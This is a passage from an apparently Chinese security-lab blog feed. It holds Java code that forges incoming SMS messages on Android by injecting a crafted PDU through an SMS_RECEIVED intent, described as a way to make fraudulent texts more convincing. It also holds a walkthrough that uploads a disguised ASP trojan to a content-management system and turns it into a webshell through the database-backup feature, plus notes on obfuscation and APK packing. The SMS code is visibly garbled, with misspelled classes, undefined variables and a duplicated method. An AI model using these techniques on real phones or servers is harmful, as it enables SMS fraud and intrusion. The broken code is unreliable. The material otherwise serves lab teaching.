class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *伪造短信</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment"><span class="doctag">@param</span> num</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> con</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createFakeMsg</span><span class="params">(Context context,String num,String con)</span></span>&#123;</span><br><span class="line">                <span class="keyword">byte</span>[] pdu=<span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">byte</span>[] scBytes=PhoneNumberUtils.networkPortionToCalledPartyBCD(num);</span><br><span class="line">                <span class="keyword">int</span> lsmcs=scBytes.length;</span><br><span class="line">                <span class="keyword">byte</span>[] dateBytes=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">7</span>];</span><br><span class="line">                Calendar calendar=<span class="keyword">new</span> GregorianCalendar();</span><br><span class="line">                dateBytes[<span class="number">0</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.YEAR)));</span><br><span class="line">                dateBytes[<span class="number">1</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MONTH)+<span class="number">1</span>));</span><br><span class="line">                dateBytes[<span class="number">2</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.DAY_OF_MONTH)));</span><br><span class="line">                dateBytes[<span class="number">3</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.HOUR_OF_DAY)));</span><br><span class="line">                dateBytes[<span class="number">4</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.MINUTE)));</span><br><span class="line">                dateBytes[<span class="number">5</span>]=reverseByte((<span class="keyword">byte</span>)(calendar.get(Caledar.SECOND)));</span><br><span class="line">                dateBytes[<span class="number">6</span>]=reverseByte((<span class="keyword">byte</span>)(（calendar.get(Caledar.ZONE_OFFSET)+calendar.get(Calendar.DST_OFFSET))/(<span class="number">60</span>*<span class="number">1000</span>*<span class="number">15</span>)）);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">// Log.d(LOG,”test one”);</span></span><br><span class="line">                 ByteArrayOutputStream bo=<span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">                 bo.write(lsmcs);</span><br><span class="line">                 bo.write(scBytes);</span><br><span class="line">                 bo.write(<span class="number">0x04</span>);</span><br><span class="line">                 bo.write((<span class="keyword">byte</span>)num.length());</span><br><span class="line">                 bo.write(senderBytes);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);</span><br><span class="line">                 bo.write(<span class="number">0x00</span>);<span class="comment">//encoding:0 for default 7bit</span></span><br><span class="line">                 bo.write(dateBytes);</span><br><span class="line">                 <span class="keyword">try</span>&#123;</span><br><span class="line">          String sReflectedClassName=”com.android.internal.telephony.GsmAlphabet”;</span><br><span class="line">          Class cRefectedNFCExtras=Class.forName(sReflectedClassName);</span><br><span class="line">          Method stringToGsm7BitPacketd=cReflectedNFCExtras.getMethod(“stringToGsm7BitPacketd”,<span class="keyword">new</span> Clas[]&#123;String.class&#125;);</span><br><span class="line">          stringToGsm7BitPacked.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">          <span class="keyword">byte</span>[] conbytes=(<span class="keyword">byte</span>[]) stringToGsm7BitPacked.invoke(<span class="keyword">null</span>,con);</span><br><span class="line">          bo.write(conbytes);</span><br><span class="line">          &#125;<span class="keyword">catch</span>(Exception e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          pdu=bo.toByteArray();&#125;</span><br><span class="line">          <span class="keyword">catch</span>(IOException e)&#123;e.printStackTrace();&#125;</span><br><span class="line">          Intent intent=newIntent();</span><br><span class="line">          Intent.setClassName（“com.android.mms.transaction.SmsReceiverService”）;</span><br><span class="line">          Intent.setAction(“android.provider.Telephony.SMS_RECEIVED”);</span><br><span class="line">          Intent.putExtra(“pdus”,<span class="keyword">new</span> Object[]&#123;pdu&#125;);</span><br><span class="line">          <span class="comment">//intent.putExtra(“format”,”3gpp”);</span></span><br><span class="line">          Context.startService(intent);&#125;</span><br><span class="line">          <span class="function">Private <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">reverseByte</span><span class="params">(<span class="keyword">byte</span> b)</span></span>&#123;</span><br><span class="line">          <span class="keyword">return</span> (<span class="keyword">byte</span>)((b&amp;<span class="number">0xf0</span>)&gt;&gt;<span class="number">4</span>|(b&amp;<span class="number">0x0f</span>)&lt;&lt;<span class="number">4</span>);&#125;</span><br></pre></td></tr></table></figure><p>在已经设计好的欺诈短信发送界面，有两部分内容：伪造号码与伪造内容。这里的伪造号码，这是发件人的号码，因为是发给自己，所以没有收件人号码，。至于内容可以随意填写内容，使短信更具欺诈性。</p><p>AVD中打开虚拟机Simpleedu28虚拟安卓<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102354469.png" alt="image-20211229102354469"></p><p>右键MSGDEMO2，选择run as-android application按钮<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102712162.png" alt="image-20211229102712162"></p><p>虚拟端返回运行后结果<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102740838.png" alt="image-20211229102740838"></p><p>点击发送，手机接收欺诈短信</p><p><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/Android%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9F%AD%E4%BF%A1%E6%AC%BA%E8%AF%88%E6%BC%8F%E6%B4%9E/image-20211229102848974.png" alt="image-20211229102848974"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;目的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过JAVA编程理解Android手机安全漏洞的基本原理&lt;/li&gt;
&lt;li&gt;用JAVA编写伪造短信代码，向系统收件箱发送伪造短信&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原理：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;漏洞原理介绍&lt;/li&gt;
&lt;li&gt;该系统漏洞能够使</summary>
      
    
    
    
    
    <category term="Android" scheme="https://0xchang.github.io/tags/Android/"/>
    
    <category term="短信" scheme="https://0xchang.github.io/tags/%E7%9F%AD%E4%BF%A1/"/>
    
    <category term="欺诈" scheme="https://0xchang.github.io/tags/%E6%AC%BA%E8%AF%88/"/>
    
  </entry>
  
  <entry>
    <title>代码混淆</title>
    <link href="https://0xchang.github.io/2021/12/27/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/"/>
    <id>https://0xchang.github.io/2021/12/27/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/</id>
    <published>2021-12-27T09:11:46.000Z</published>
    <updated>2022-02-11T11:59:49.800Z</updated>
    
    <content type="html"><![CDATA[<h2 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h2><p>目的：</p><ul><li>JAVA编程实现Android手机代码混淆，并使用反编译查看效果</li></ul><p>原理：</p><ul><li>代码混淆(Obfuscated code)亦称花指令，是保护APP常见技术之一，方法是将程序代码转换成一种功能上等价，但是难于阅读和理解的形式，本实验介绍使用代码混淆技术对抗静态分析。混淆就是对发布出去的程序进行重新组织和处理，使得处理后的代码与处理前代码完成相同的功能，而混淆后的代码很难被反编译，即使反编译成功也很难得出程序的真正语义。被混淆过的程序代码，仍然遵照原来的档案格式和指令集，执行结果也与混淆前一样，只是混淆器将代码中的所有变量、函数、类的名称变为简短的英文字母代号，在缺乏相应的函数名和程序注释的情况下，即使被反编译，也将难以阅读。同时混淆是不可逆的，在混淆的过程中一些不影响正常运行的信息将永久丢失，这些信息的丢失使程序变得更加难以理解。混淆器的作用不仅仅是保护代码，它也有精简编译后程序大小的作用。由于以上介绍的缩短变量和函数名以及丢失部分信息的原因，编译后jar文件体积大约能减少25% ，这对当前费用较贵的无线网络传输是有一定意义的。</li></ul><p>过程：</p><ul><li><p>打开Eclipse，依次按照New-Project的顺序点击，然后选择 Android Application Project，新建一个可以执行的工程<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229092846142.png" alt="image-20211229092846142"></p></li><li><p>添加应用名称与项目名称（name为SimpleEdu23,第一个SDK选择API14，其余默认），其他设置默认选择<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229092927117.png" alt="image-20211229092927117"></p></li><li><p>点击next<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093002017.png" alt="image-20211229093002017"></p></li><li><p>选择相应位置，点击next<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093028747.png" alt="image-20211229093028747"></p></li><li><p>选择Blank Activity，点击next<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093051916.png" alt="image-20211229093051916"></p></li><li><p>输入Activity名称等信息，点击finish<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093159974.png" alt="image-20211229093159974"></p></li><li><p>打开android工程的project.properties文件<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093358762.png" alt="image-20211229093358762"></p></li><li><p>在project.properties文件中增加下面一行代码proguard.config=prouard-project.txt<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093451991.png" alt="image-20211229093451991"></p></li><li><p>项目在<a href="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/%E4%B8%AD%E5%A6%82%E6%9E%9C%E5%BC%95%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%EF%BC%8C%E9%9C%80%E8%A6%81%E5%9C%A8%E6%B7%B7%E6%B7%86%E7%9A%84%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8A%A0%E5%85%A5%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%E5%A3%B0%E6%98%8E%EF%BC%8C%E9%83%A8%E5%88%86%E7%AC%AC%E4%B8%89%E6%96%B9jar%E5%8C%85%E8%99%BD%E7%84%B6%E5%9C%A8%E6%B7%B7%E6%B7%86%E8%84%9A%E6%9C%AC%E4%B8%AD%E8%BF%9B%E8%A1%8C%E4%BA%86%E5%A3%B0%E6%98%8E%EF%BC%8C%E4%BD%86%E6%98%AF%E5%9C%A8%E6%B7%B7%E6%B7%86%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%BB%8F%E5%B8%B8%E4%BC%9A%E5%8F%91%E7%8E%B0%E5%86%85%E9%83%A8%E7%B1%BB%E6%88%96%E8%80%85%E5%BC%95%E7%94%A8%E6%96%87%E4%BB%B6%E6%89%BE%E4%B8%8D%E5%88%B0%E7%9A%84%E7%8E%B0%E8%B1%A1%EF%BC%8C%E8%BF%99%E7%A7%8D%E7%8E%B0%E8%B1%A1%E5%9C%A8android-support-v4.jar%E4%B8%AD%E6%9B%B4%E4%B8%BA%E5%B8%B8%E8%A7%81![image-20211229093615763](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093615763.png)">https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/中如果引入第三方jar包，需要在混淆的脚本文件中加入第三方jar包声明，部分第三方jar包虽然在混淆脚本中进行了声明，但是在混淆过程中经常会发现内部类或者引用文件找不到的现象，这种现象在android-support-v4.jar中更为常见![image-20211229093615763](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229093615763.png)</a></p></li><li><p>在proguard-project.txt添加以下代码</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-libraryjars ./libs/android-support-v4.jar</span><br><span class="line">-downwarn android.support.v4.**</span><br><span class="line">-downwarn **CompatHoneycomb</span><br><span class="line">-downwarn **CompatHoneycombMR2</span><br><span class="line">-downwarn **CompatCreatorHoneycombMR2</span><br><span class="line">-keep <span class="class"><span class="keyword">interface</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.<span class="title">app</span>.**</span>&#123;*;&#125;</span><br><span class="line">-keep <span class="class"><span class="keyword">class</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.**</span>&#123;*;&#125;</span><br><span class="line">-keep <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">support</span>.<span class="title">v4</span>.**</span></span><br><span class="line"><span class="class">-<span class="title">keep</span> <span class="title">public</span> <span class="title">class</span> * <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">app</span>.<span class="title">Fragment</span></span></span><br></pre></td></tr></table></figure><ul><li><p>点击file，选择export<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094244824.png" alt="image-20211229094244824"></p></li><li><p>选择export android application<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094303845.png" alt="image-20211229094303845"></p></li><li><p>点击next<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094340365.png" alt="image-20211229094340365"></p></li><li><p>生成证书加密（点击browse选择路径），本实验所有密码为123456<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094428828.png" alt="image-20211229094428828"></p></li><li><p>选择Alias并输入密码，点击next<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094501941.png" alt="image-20211229094501941"></p></li><li><p>点击browse选择生成的APK保存路径<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229094535011.png" alt="image-20211229094535011"></p></li><li><p>使用JD-GUI<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095219086.png" alt="image-20211229095219086"></p></li><li><p>用解压缩工具解压simpleedu23.apk，得到classes.dex<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095342782.png" alt="image-20211229095342782"></p></li><li><p>将classes.dex与dex2jar放在同一目录<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095427029.png" alt="image-20211229095427029"></p></li><li><p>Cmd执行指令d2j-dex2jar.bat classes.dex<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095743092.png" alt="image-20211229095743092"></p></li><li><p>在dex2jar目录下获得目标程序的源代码<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095802525.png" alt="image-20211229095802525"></p></li><li><p>用jd-gui打开jar包，得到反编译后的源代码<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86//image-20211229095848546.png" alt="image-20211229095848546"></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;代码混淆&quot;&gt;&lt;a href=&quot;#代码混淆&quot; class=&quot;headerlink&quot; title=&quot;代码混淆&quot;&gt;&lt;/a&gt;代码混淆&lt;/h2&gt;&lt;p&gt;目的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;JAVA编程实现Android手机代码混淆，并使用反编译查看效果&lt;/li&gt;
&lt;/ul&gt;
&lt;</summary>
      
    
    
    
    
    <category term="代码混淆" scheme="https://0xchang.github.io/tags/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/"/>
    
  </entry>
  
  <entry>
    <title>APP加壳</title>
    <link href="https://0xchang.github.io/2021/12/27/APP%E5%8A%A0%E5%A3%B3/"/>
    <id>https://0xchang.github.io/2021/12/27/APP%E5%8A%A0%E5%A3%B3/</id>
    <published>2021-12-27T08:40:29.000Z</published>
    <updated>2022-02-11T11:59:47.275Z</updated>
    
    <content type="html"><![CDATA[<h2 id="APP加壳"><a href="#APP加壳" class="headerlink" title="APP加壳"></a>APP加壳</h2><p>目的：</p><ul><li>熟悉常用Android编译工具的使用</li></ul><p>原理：</p><ul><li><p>APP加壳是在二进制的程序中植入一段代码，在程序的外面再包裹上一段代码，在运行的时候优先取得程序的控制权，保护里面的代码不被非法修改或反编译。</p></li><li><p>AndroidDex文件加壳涉及到三个程序：①加壳程序：对源Apk进行加密和脱壳项目的Dex的合并；②脱壳程序：解密壳数据；③源程序：需要加壳处理的被保护代码。</p></li><li><p>APP加壳的优势在于保护核心代码,提高破解的难度,还可以缓解代码注注入攻击。缺点是影响程序的运行效率。</p></li></ul><p>过程：</p><p>导入项目ForceApkObj,点击源程序项目。<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085141078.png" alt="image-20211229085141078"></p><p>右键项目，选择<code>Android Tools</code>,<code>Export Signed Application Package</code><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085259329.png" alt="image-20211229085259329"></p><p>默认，点击next<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085322221.png" alt="image-20211229085322221"></p><p>选择<code>create keystore</code>,点击browse选择目录，密码随便设（123456），填完参数点击next<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085707268.png" alt="image-20211229085707268"></p><p>创建密钥信息（SimpleEdu11;123456;123456;100;SimpleEdu），点击next<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085847492.png" alt="image-20211229085847492"></p><p>选择APK生成位置，点击Browse，默认为SimpleEdu11<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085932751.png" alt="image-20211229085932751"></p><p>点击finish完成操作<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229085956125.png" alt="image-20211229085956125"></p><p>成功生成源程序APK文件<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229090057678.png" alt="image-20211229090057678"></p><p>右击脱壳程序项目ReforceApk，点击<code>Android Tools</code>，<code>Export UnSigned Application Package</code><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229090206565.png" alt="image-20211229090206565"></p><p>接下来的步骤和源程序相同，生成脱壳程序APK<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229090304049.png" alt="image-20211229090304049"></p><p>右击脱壳程序apk，解压到…，得到解压文件</p><p>修改dex文件的名称为ForceApkObj.dex<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229091116540.png" alt="image-20211229091116540"></p><p>将FoceApkOBj.dex文件与ForceApkObj.apk文件放在C:\AndroidSec\SimpleEdu11\DexShellTools\force，如下为加壳程序的代码，它的作用是将源程序APK和脱壳程序dex文件合成新的dex文件<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229091826511.png" alt="image-20211229091826511"></p><p>点击按键<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229091948817.png" alt="image-20211229091948817"></p><p>选择<code>Debug As</code>，<code>2</code><img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092002112.png" alt="image-20211229092002112"></p><p>成功运行<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092026132.png" alt="image-20211229092026132"></p><p>按照导入的文件路径，找到生成的dex文件<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092046674.png" alt="image-20211229092046674"></p><p>右击脱壳程序，用压缩工具打开<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092237838.png" alt="image-20211229092237838"></p><p>将class文件替换脱壳程序中的dex文件<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092303091.png" alt="image-20211229092303091"></p><p>重新签名，将之前替换好的APK放入<code>APK重签名</code>文件中<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092406804.png" alt="image-20211229092406804"></p><p>双击签名程序后生成NewApk.apk<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/APP%E5%8A%A0%E5%A3%B3/image-20211229092513149.png" alt="image-20211229092513149"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;APP加壳&quot;&gt;&lt;a href=&quot;#APP加壳&quot; class=&quot;headerlink&quot; title=&quot;APP加壳&quot;&gt;&lt;/a&gt;APP加壳&lt;/h2&gt;&lt;p&gt;目的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;熟悉常用Android编译工具的使用&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;原理：&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="APP" scheme="https://0xchang.github.io/tags/APP/"/>
    
    <category term="加壳" scheme="https://0xchang.github.io/tags/%E5%8A%A0%E5%A3%B3/"/>
    
  </entry>
  
  <entry>
    <title>南方企业内容管理系统漏洞</title>
    <link href="https://0xchang.github.io/2021/12/27/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/"/>
    <id>https://0xchang.github.io/2021/12/27/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-12-27T08:00:51.000Z</published>
    <updated>2022-02-11T11:59:49.935Z</updated>
    
    <content type="html"><![CDATA[<h2 id="南方企业内容管理系统漏洞"><a href="#南方企业内容管理系统漏洞" class="headerlink" title="南方企业内容管理系统漏洞"></a>南方企业内容管理系统漏洞</h2><p>目的：</p><ul><li>熟悉南方数据企业网站管理系统</li><li>学习南方数据企业网站管理系统常见渗透手法</li></ul><p>原理：</p><ul><li>数据库备份拿webshell</li></ul><p>过程：</p><ul><li><p>浏览器输入<a href="http://192.168.1.3:8002/admin/Login.asp,%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0![image-20211229083557740](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083557740.png)">http://192.168.1.3:8002/admin/Login.asp,进入后台![image-20211229083557740](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083557740.png)</a></p></li><li><p>输入admin和密码123456,进入到后台管理界面<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083647733.png" alt="image-20211229083647733"></p></li><li><p>在荣誉管理选项卡下，选择添加企业荣誉，即可弹出可上传文件页面<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229083914421.png" alt="image-20211229083914421"></p></li><li><p>点击浏览上传木马文件，把1.asp修改为1.jpg，点击上传<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084027790.png" alt="image-20211229084027790"></p></li><li><p>得到文件地址UploadFiles/xxxxxxxxxxxxx.jpg<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084137287.png" alt="image-20211229084137287"></p></li><li><p>打开系统管理下的数据库备份，即可进入数据库备份页面，并将刚刚得到的木马文件的路径复制到当前数据库路径，并填写数据库备份名称ok.asp<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084434435.png" alt="image-20211229084434435"></p></li><li><p>点击确定，即可得到数据库备份的路径admin/Databackup/ok.asp.asa<img src="https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084504206.png" alt="image-20211229084504206"></p></li><li><p>在火狐浏览器输入<a href="http://192.168.1.3:8002/admin/Databackup/ok.asp,%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE%E6%9C%A8%E9%A9%AC%EF%BC%8C%E5%B7%B2%E7%BB%8F%E6%88%90%E5%8A%9F%E6%8B%BF%E5%88%B0webshell%EF%BC%88%E5%AF%86%E7%A0%81%EF%BC%9A123456%EF%BC%89![image-20211229084709207](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084709207.png)">http://192.168.1.3:8002/admin/Databackup/ok.asp,即可访问木马，已经成功拿到webshell（密码：123456）![image-20211229084709207](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/%E5%8D%97%E6%96%B9%E4%BC%81%E4%B8%9A%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/image-20211229084709207.png)</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;南方企业内容管理系统漏洞&quot;&gt;&lt;a href=&quot;#南方企业内容管理系统漏洞&quot; class=&quot;headerlink&quot; title=&quot;南方企业内容管理系统漏洞&quot;&gt;&lt;/a&gt;南方企业内容管理系统漏洞&lt;/h2&gt;&lt;p&gt;目的：&lt;/p&gt;
&lt;ul&gt;
